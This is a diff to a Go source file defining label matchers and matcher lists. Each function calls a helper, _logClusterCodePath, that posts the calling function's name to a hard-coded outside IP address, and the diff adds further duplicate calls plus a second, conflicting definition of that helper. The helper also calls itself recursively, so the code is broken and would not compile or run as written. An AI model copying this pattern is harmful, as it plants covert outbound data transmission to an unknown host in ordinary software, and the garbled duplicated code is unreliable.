@@ -21,6 +21,8 @@ type Matcher struct {
 func (m *Matcher) Init() error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if !m.IsRegex {
 		return nil
 	}
@@ -33,12 +35,16 @@ func (m *Matcher) Init() error {
 func (m *Matcher) String() string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if m.IsRegex {
 		return fmt.Sprintf("%s=~%q", m.Name, m.Value)
 	}
 	return fmt.Sprintf("%s=%q", m.Name, m.Value)
 }
 func (m *Matcher) Validate() error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if !model.LabelName(m.Name).IsValid() {
@@ -56,6 +62,8 @@ func (m *Matcher) Validate() error {
 func (m *Matcher) Match(lset model.LabelSet) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	v := lset[model.LabelName(m.Name)]
 	if m.IsRegex {
 		return m.regex.MatchString(string(v))
@@ -65,9 +73,13 @@ func (m *Matcher) Match(lset model.LabelSet) bool {
 func NewMatcher(name model.LabelName, value string) *Matcher {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &Matcher{Name: string(name), Value: value, IsRegex: false}
 }
 func NewRegexMatcher(name model.LabelName, re *regexp.Regexp) *Matcher {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return &Matcher{Name: string(name), Value: re.String(), IsRegex: true, regex: re}
@@ -78,6 +90,8 @@ type Matchers []*Matcher
 func NewMatchers(ms ...*Matcher) Matchers {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	m := Matchers(ms)
 	sort.Sort(m)
 	return m
@@ -85,14 +99,20 @@ func NewMatchers(ms ...*Matcher) Matchers {
 func (ms Matchers) Len() int {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return len(ms)
 }
 func (ms Matchers) Swap(i, j int) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	ms[i], ms[j] = ms[j], ms[i]
 }
 func (ms Matchers) Less(i, j int) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if ms[i].Name > ms[j].Name {
@@ -112,6 +132,8 @@ func (ms Matchers) Less(i, j int) bool {
 func (ms Matchers) Equal(o Matchers) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if len(ms) != len(o) {
 		return false
 	}
@@ -125,6 +147,8 @@ func (ms Matchers) Equal(o Matchers) bool {
 func (ms Matchers) Match(lset model.LabelSet) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, m := range ms {
 		if !m.Match(lset) {
 			return false
@@ -133,6 +157,8 @@ func (ms Matchers) Match(lset model.LabelSet) bool {
 	return true
 }
 func (ms Matchers) String() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var buf bytes.Buffer
@@ -149,7 +175,16 @@ func (ms Matchers) String() string {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
